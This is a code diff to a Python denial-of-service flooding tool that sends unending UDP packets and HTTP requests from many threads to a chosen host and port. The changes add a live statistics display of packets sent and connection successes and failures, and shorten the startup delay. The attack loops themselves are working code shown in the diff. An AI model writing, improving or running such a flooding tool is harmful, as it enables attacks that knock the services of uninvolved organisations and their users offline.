@@ -5,8 +5,13 @@ import signal
 import sys
 import threading
 import time
+import subprocess
 import urllib.request
 from optparse import OptionParser
+
+
+# Constants
+GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
 
 
 def user_agent():
@@ -52,6 +57,7 @@ def get_random_port():
 
 
 def down_it_udp():
+    global packet_count
     i = 1
     while True:
         if random_packet_len:
@@ -66,12 +72,17 @@ def down_it_udp():
             + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         p = int(port) if port else get_random_port()
+
         try:
             s.sendto(packet, (host, p))
         except socket.gaierror:
-            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
+            if GETTING_SERVER_IP_ERROR_MSG not in errors:
+                errors.append(GETTING_SERVER_IP_ERROR_MSG)
         else:
-            print('\033[92m Packet was sent \033[0;0m')
+            if GETTING_SERVER_IP_ERROR_MSG in errors:
+                errors.remove(GETTING_SERVER_IP_ERROR_MSG)
+            packet_count += 1
+            # print('\033[92m Packet was sent \033[0;0m')
         s.close()
 
         if port:
@@ -85,6 +96,7 @@ def down_it_udp():
 
 
 def down_it_http():
+    global packet_count
     while True:
         protocol = 'http://'
         if port == 443:
@@ -99,11 +111,12 @@ def down_it_http():
                 urllib.request.Request(url, headers=http_headers)
             )
         except:
-            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
-                  " Program will continue working.\033[0m")
+            connections['fail'] += 1
         else:
-            print('\033[92m HTTP-Request was done \033[0;0m')
+            connections['success'] += 1
+            # print('\033[92m HTTP-Request was done \033[0;0m')
 
+        packet_count += 1
         time.sleep(.01)
 
 
@@ -181,12 +194,44 @@ def connect_host():
         s.settimeout(5)
         s.connect((host, int(port)))
     except:
-        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
-              " Program will continue send UDP-packets to the destination.\033[0m")
+        connections['fail'] += 1
+    else:
+        connections['success'] += 1
+
+
+def show_statistics():
+    # Prints statistics to console
+    subprocess.call("clear")
+    subprocess.call("clear")  # Hack for docker
+    m = f"Host, port: \033[94m{host}:{port}\033[0m\n"
+    m += f"Attack method: \033[94m{attack_method}\033[0m\n"
+    m += f"Threads: \033[94m{thr}\033[0m\n\n"
+    if attack_method == 'udp' and random_packet_len:
+        m += f"Random packet length: yes\n"
+    if attack_method == 'udp':
+        m += f"UDP packets sent: \033[92m{packet_count}\033[0;0m\n"
+    elif attack_method == 'http':
+        m += f"HTTP requests sent: \033[92m{packet_count}\033[0;0m\n"
+    m += f"Connections: successful - \033[92m{connections['success']}\033[0;0m, failed - \033[91m{connections['fail']}\033[0m\n"
+    for error in errors:
+        m += error + '\n'
+    sys.stdout.write(m)
+    sys.stdout.flush()
 
 
 def main():
     """The main function to run the script from the command line."""
+    global packet_count
+    global connections
+    global errors
+
+    packet_count = 0
+    errors = []
+    connections = {
+        'success': 0,
+        'fail': 0,
+    }
+
     if len(sys.argv) < 2:
         usage()
     get_parameters()
@@ -195,15 +240,11 @@ def main():
         print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
         exit()
 
-    if port:
-        connect_host()
-
     p = str(port) if port else '(22, 53, 80, 443)'
-    print("\033[92m", host, " port: ", p, " threads: ", str(thr), "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
     headers()
-    time.sleep(5)
+    time.sleep(2)
 
     thrs = []
     for i in range(int(thr)):
@@ -216,7 +257,8 @@ def main():
         thrs[i].start()
 
     while True:
-        time.sleep(.1)
+        show_statistics()
+        time.sleep(3)
 
 
 if __name__ == '__main__':
